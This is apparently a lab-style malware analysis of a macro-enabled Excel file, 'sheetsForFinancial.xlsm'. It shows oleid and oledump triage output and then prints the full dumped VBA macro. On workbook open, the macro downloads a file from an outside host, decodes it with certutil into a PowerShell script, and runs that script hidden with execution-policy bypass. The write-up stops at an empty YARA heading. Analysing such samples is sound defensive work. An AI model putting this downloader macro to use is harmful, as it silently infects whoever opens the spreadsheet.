# sheetsForFinancial.xlsm

# Identification:

**FileName:** sheetsForFinancial.xlsm

**SHA256:** 16e6489b81a41f0bfc2bc9bb0165b624c51ed4fecf6438c73a5ee6501caf34dc

**FileSize:** 20480 (bytes)

<br>

# Analysis:

The analysis was started by checking if the excel contain macro. For this Oletools were used. Initial traige on the sample was carried out using oleid to check for any macro or remote template injections. 

 `oleid sheetsForFinancial.xlsm`

    oleid 0.60.dev1 - http://decalage.info/oletools
    THIS IS WORK IN PROGRESS - Check updates regularly!
    Please report any issue at https://github.com/decalage2/oletools/issues
    
    Filename: sheetsForFinancial.xlsm
    --------------------+--------------------+----------+--------------------------
    Indicator           |Value               |Risk      |Description
    --------------------+--------------------+----------+--------------------------
    File format         |MS Excel 2007+      |info      |
                        |Macro-Enabled       |          |
                        |Workbook (.xlsm)    |          |
    --------------------+--------------------+----------+--------------------------
    Container format    |OpenXML             |info      |Container type
    --------------------+--------------------+----------+--------------------------
    Encrypted           |False               |none      |The file is not encrypted
    --------------------+--------------------+----------+--------------------------
    VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA
                        |                    |          |macros. Suspicious
                        |                    |          |keywords were found. Use
                        |                    |          |olevba and mraptor for
                        |                    |          |more info.
    --------------------+--------------------+----------+--------------------------
    XLM Macros          |No                  |none      |This file does not contain
                        |                    |          |Excel 4/XLM macros.
    --------------------+--------------------+----------+--------------------------
    External            |0                   |none      |External relationships
    Relationships       |                    |          |such as remote templates,
                        |                    |          |remote OLE objects, etc
    --------------------+--------------------+----------+--------------------------

Here, from the result of oleid tool, it was found that this excel file contain VBA macro.

Using the oledump tool, it was then checked which stream contains the macro as shown below.

`oledump.py sheetsForFinancial.xlsm`

    A: xl/vbaProject.bin      
     A1:       468 'PROJECT'  
     A2:        86 'PROJECTwm'
     A3: M    7829 'VBA/Module
     A4: m    1196 'VBA/Sheet1
     A5: m    1204 'VBA/ThisWo
     A6:      3130 'VBA/_VBA_P
     A7:      4020 'VBA/__SRP_
     A8:       272 'VBA/__SRP_
     A9:      3892 'VBA/__SRP_
    A10:       220 'VBA/__SRP_
    A11:       680 'VBA/__SRP_
    A12:       106 'VBA/__SRP_
    A13:       464 'VBA/__SRP_
    A14:       106 'VBA/__SRP_
    A15:       562 'VBA/dir'  

Here, the streams 3, 4 and 5 seems to contain macro.

Again using the oledump tool, the macro from stream 3 was dumped using the command.

`oledump.py -s 3 -v sheetsForFinancial.xlsm`

    Attribute VB_Name = "Module1"
    Function genStr(Length As Integer)
    Dim chars As Variant
    Dim x As Long
    Dim str As String
    
      If Length < 1 Then
        Exit Function
      End If
    
    chars = Array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", _
      "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", _
      "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "!", "@", _
      "#", "$", "%", "^", "&", "*", "A", "B", "C", "D", "E", "F", "G", "H", _
      "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", _
      "W", "X", "Y", "Z")
      For x = 1 To Length
        Randomize
        str = str & chars(Int((UBound(chars) - LBound(chars) + 1) * Rnd + LBound(chars)))
      Next x
    
      randStr = str
    
    End Function
            Sub Workbook_Open()
                Dim str1: genStr (17)
                Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
                str2 = "wgd2l0aCB5b3VyIG93biBjbGV2ZXIgdGhvdWdodHMgYW5kIGlkZWFzLiBEbyB5b3UgbmVlZCBhIG1hbmFnZXI/CgpNdXN0IGdvIGZhc3Rlci4uLiBnbywgZ28sIGdvLCBnbywgZ28hIFRoaXMgdGhpbmcgY29tZXMgZnVsbHkgbG9hZGVkLiBBTS9GTSByYWRpbywgcmVjbGluaW5nIGJ1Y2tldC"
                Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
                str3 = "WQgd2l0aCB0aGUgZmF0IGxhZHkhIERyaXZlIHVzIG91dCBvZiBoZXJlISBGb3JnZXQgdGhlIGZhdCBsYWR5ISBZb3UncmUgb2JzZXNzZWQg"
                xHttp.Open "GET", "http://srv3.wonderballfinancial.local/abc123.crt", False
                xHttp.Send
                Dim str9: genStr (10)
                With bStrm
                .Type = 1 '//binary
                .Open
                .write xHttp.responseBody
                .savetofile "encd.crt", 2 '//overwrite
                End With
                str5 = "WQgd2l0aCB0aGUgZmF0IGxhZHkhIERyaXZlIHVzIG91dCBvZiBoZXJlISBGb3JnZXQgdGhlIGZhdCBsYWR5ISBZb3UncmUgb2JzZXNzZWQg"
                str6 = "Z2V0IG15IGVzcHJlc3NvIG1hY2hpbmU/IEp1c3QgbXkgbHVjaywgbm8gaWNlLiBZb3UncmUgYSB2ZXJ5IHRhbGVudGVkIHlvdW5nIG1hbiwgd2l0aCB5b3VyIG93biBjbGV2ZXIgdGhvdWdodHMgYW5kIGlkZWZ2V0IG15IGVzcHJlc3NvIG1hY2hpbmU/IEp1c3QgbXkgbHVjaywgbm8gaWNlLiBZb3UncmUgYSB2ZXJ5IHRhbGVudGVkIHlvdW5nIG1hbiwgd2l0aCB5b3VyIG93biBjbGV2ZXIgdGhvdWdodHMgYW5kIGlkZW"
                Shell ("cmd /c certutil -decode encd.crt run.ps1 & c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -ep bypass -W Hidden .\run.ps1")
            End Sub



<br>

# Detection with Yara Rule:


